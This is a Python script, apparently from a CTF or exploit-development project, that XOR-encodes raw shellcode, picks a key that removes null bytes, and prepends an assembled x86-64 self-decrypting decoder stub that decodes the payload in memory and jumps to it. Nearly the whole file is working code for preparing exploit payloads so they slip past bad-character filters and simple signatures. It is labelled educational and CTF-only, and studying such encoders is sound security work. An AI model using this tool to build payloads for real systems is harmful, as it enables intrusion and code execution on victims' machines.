#!/usr/bin/env python3
# src/scripts/encoder.py
# ---------------------------------------------------------------------------
# Custom XOR encoder + null-free self-decrypting payload builder.
#
# Capabilities:
#   * xor_encode(data, key)            single-byte XOR
#   * pick_key(data)                   smallest key yielding a null-free output
#   * decoder_stub(key, length)        null-free PIC x86-64 XOR decoder (asm)
#   * build_payload(data, key=None)    decoder + encoded bytes, null-free,
#                                       self-decrypting at runtime
#
# The decoder stub (assembled via pwntools/nasm):
#     jmp getip
#   decoder:
#     pop rsi                ; rsi -> encoded payload (right after the call)
#     push <len>  ; pop rcx  ; rcx = length
#     xor rax, rax           ; index = 0
#     mov dl, <key>
#   loop:
#     xor byte [rsi+rax], dl ; decode in place
#     inc rax ; cmp rax, rcx ; jne loop
#     jmp rsi                ; execute decoded shellcode
#   getip:
#     call decoder            ; pushes payload address onto the stack
#
# Every instruction above is null-free; lengths must be < 128 (push imm8 limit).
# Educational / CTF use only.
# ---------------------------------------------------------------------------
import argparse
import sys
from pathlib import Path


def xor_encode(data: bytes, key: int) -> bytes:
    """XOR every byte of `data` with single-byte `key`."""
    if not 0 < key < 256:
        raise ValueError("key must be in range 1..255")
    return bytes(b ^ key for b in data)


def pick_key(data: bytes) -> int:
    """Smallest key yielding a null-free payload.

    Note: single-byte XOR can remove null bytes but cannot *also* avoid the key
    byte itself when the input contains 0x00 (since 0x00 ^ key == key).
    Null-removal is the property that matters for shellcode, so that's all we
    guarantee here.
    """
    for key in range(1, 256):
        if b"\x00" not in xor_encode(data, key):
            return key
    raise RuntimeError("No single-byte key produces a null-free payload")


def decoder_stub(key: int, length: int) -> bytes:
    """Assemble a null-free, position-independent x86-64 XOR decoder.

    The encoded payload must follow the stub contiguously in memory. Requires
    key in 1..255 and length in 1..127 (push-imm8 encoding limit). Assembled
    with `nasm -f bin` so the bytes are exactly the stub (no ELF wrapping) and
    NASM encodes the memory operands correctly.
    """
    if not 0 < key < 256:
        raise ValueError("key must be 1..255")
    if not 0 < length < 128:
        raise ValueError("length must be 1..127 for a null-free push-imm8 decoder")

    import subprocess
    import tempfile
    src = f"""\
BITS 64
    jmp getip
decoder:
    pop rsi
    push {length}
    pop rcx
    xor rax, rax
    mov dl, 0x{key:02x}
decode_loop:
    xor byte [rsi + rax], dl
    inc rax
    cmp rax, rcx
    jne decode_loop
    jmp rsi
getip:
    call decoder
"""
    with tempfile.TemporaryDirectory() as tmp:
        asm_path = Path(tmp) / "decoder.asm"
        bin_path = Path(tmp) / "decoder.bin"
        asm_path.write_text(src)
        subprocess.run(
            ["nasm", "-f", "bin", "-o", str(bin_path), str(asm_path)],
            check=True, capture_output=True,
        )
        stub = bin_path.read_bytes()
    if b"\x00" in stub:
        raise RuntimeError(
            f"decoder stub has null bytes (key=0x{key:02x}, len={length}); "
            "try a different key or shorten the payload")
    return stub


def build_payload(data: bytes, key: int | None = None) -> bytes:
    """Return decoder + XOR-encoded data: a null-free, self-decrypting payload."""
    if key is None:
        key = pick_key(data)
    encoded = xor_encode(data, key)
    return decoder_stub(key, len(data)) + encoded


def to_c_array(data: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in data)


def main() -> int:
    ap = argparse.ArgumentParser(description="XOR-encode shellcode (null-free)")
    ap.add_argument("input", type=Path, help="raw shellcode file (e.g. bin/execve.bin)")
    ap.add_argument("-k", "--key", type=lambda x: int(x, 0), default=None,
                    help="XOR key (1..255). Auto-selects a null-free key if omitted.")
    ap.add_argument("--decode", action="store_true",
                    help="emit a self-decrypting payload (decoder + encoded bytes)")
    ap.add_argument("-o", "--output", type=Path, default=None,
                    help="write raw bytes to file instead of printing a C array")
    args = ap.parse_args()

    try:
        raw = args.input.read_bytes()
    except FileNotFoundError:
        print(f"error: input file not found: {args.input}", file=sys.stderr)
        return 1
    key = args.key if args.key is not None else pick_key(raw)

    if args.decode:
        out = build_payload(raw, key)
        label = "self-decrypting payload"
    else:
        out = xor_encode(raw, key)
        label = "encoded payload"

    print(f"[*] Original length   : {len(raw)} bytes")
    print(f"[*] XOR key           : 0x{key:02x}")
    print(f"[*] {label} length : {len(out)} bytes")
    print(f"[*] Null bytes        : {out.count(0)}")
    if args.output:
        args.output.write_bytes(out)
        print(f"[*] Wrote raw bytes   : {args.output}")
    else:
        print(f"[*] C array           : \"{to_c_array(out)}\"")
    return 0


if __name__ == "__main__":
    sys.exit(main())
